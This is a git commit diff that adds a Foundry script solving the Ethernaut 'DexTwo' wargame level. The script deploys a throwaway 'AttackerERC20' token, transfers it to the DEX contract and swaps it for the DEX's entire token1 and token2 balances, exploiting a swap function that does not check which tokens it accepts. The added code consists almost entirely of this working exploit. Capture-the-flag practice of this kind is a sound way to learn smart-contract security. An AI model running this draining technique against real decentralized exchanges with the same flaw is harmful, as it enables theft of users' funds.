3c036c07c25e40dc11f8177f4a8b3a40111add08
siegfriedbz <siegfried.bozza@yahoo.com>
2025-06-22 16:29:25 +0200

    add /DexTwoScript solution

--- script/DexTwoScript.s.sol
+++ script/DexTwoScript.s.sol
@@ -5,19 +5,32 @@ import "../src/DexTwo.sol";
 import "forge-std/Script.sol";
 import "forge-std/console.sol";
 
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+
+contract AttackerERC20 is ERC20 {
+    uint256 constant INITIAL_SUPPLY = 1000;
+
+    constructor() ERC20("Attacker", "Attacker") {
+        _mint(msg.sender, INITIAL_SUPPLY);
+    }
+}
+
 contract DexTwoScript is Script {
     address constant ETHERNAUT_CONTRACT_ADDRESS = 0x0d4C8c2C5B02aA8a120c602CF2ebb822BF55213f;
     DexTwo public dex = DexTwo(payable(ETHERNAUT_CONTRACT_ADDRESS));
 
     address token1Address;
     address token2Address;
-    SwappableToken token1;
-    SwappableToken token2;
+    SwappableTokenTwo token1;
+    SwappableTokenTwo token2;
 
     uint256 playerToken1Bal;
     uint256 playerToken2Bal;
     uint256 dexToken1Bal;
     uint256 dexToken2Bal;
+
+    AttackerERC20 attackerToken;
 
     address PLAYER = vm.envAddress("MY_ADDRESS");
 
@@ -25,23 +38,40 @@ contract DexTwoScript is Script {
         token1Address = dex.token1();
         token2Address = dex.token2();
 
-        token1 = SwappableToken(token1Address);
-        token2 = SwappableToken(token2Address);
+        token1 = SwappableTokenTwo(token1Address);
+        token2 = SwappableTokenTwo(token2Address);
 
-        // // dex token 1 & 2 balance
-        // dexToken1Bal = token1.balanceOf(address(dex));
-        // dexToken2Bal = token2.balanceOf(address(dex));
+        dexToken1Bal = token1.balanceOf(address(dex));
+        dexToken2Bal = token2.balanceOf(address(dex));
 
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+        // deploy AttackerERC20
+        attackerToken = new AttackerERC20();
 
-        // 1. approve dex for max tokens (1 & 2)
+        // approve dex for max tokens (1 & 2)
         uint256 max = type(uint256).max;
         dex.approve(address(dex), max);
 
-        // 2
+        // approve dex for attackerToken
+        attackerToken.approve(address(dex), max);
 
-        // 3 remove dex approval for tokens (1 & 2)
+        // transfer attackerToken to DEX
+        uint256 amount = 100;
+
+        attackerToken.transfer(address(dex), amount);
+
+        // swap amount * attackerToken for all token1
+        dex.swap(address(attackerToken), token1Address, amount);
+
+        // swap 2 * amount * attackerToken for all token2
+        amount = 2 * amount;
+        dex.swap(address(attackerToken), token2Address, amount);
+
+        // remove dex approval for tokens (1 & 2)
         dex.approve(address(dex), 0);
+
+        // remove dex approval for attackerToken
+        attackerToken.approve(address(dex), 0);
 
         vm.stopBroadcast();
 
@@ -54,19 +84,5 @@ contract DexTwoScript is Script {
         dexToken2Bal = token2.balanceOf(address(dex));
         console.log("dexToken1Bal", dexToken1Bal);
         console.log("dexToken2Bal", dexToken2Bal);
-    }
-
-    // make sure the DEX has enough of the token we are asking for
-    function _maxAmountToSwap(address _from, uint256 _amountFrom) private view returns (uint256) {
-        /**
-         * swap tokenA for tokenB
-         * amountTokenB = amountTokenA * DexBalTokenB / DexBalTokenA
-         * amountTokenB must be <= DexBalTokenB
-         * ===> amountTokenA / DexBalTokenA <= 1
-         * ======> amountTokenA <= DexBalTokenA
-         */
-        uint256 dexBalFrom = SwappableToken(_from).balanceOf(address(dex));
-
-        return _amountFrom <= dexBalFrom ? _amountFrom : dexBalFrom;
     }
 }
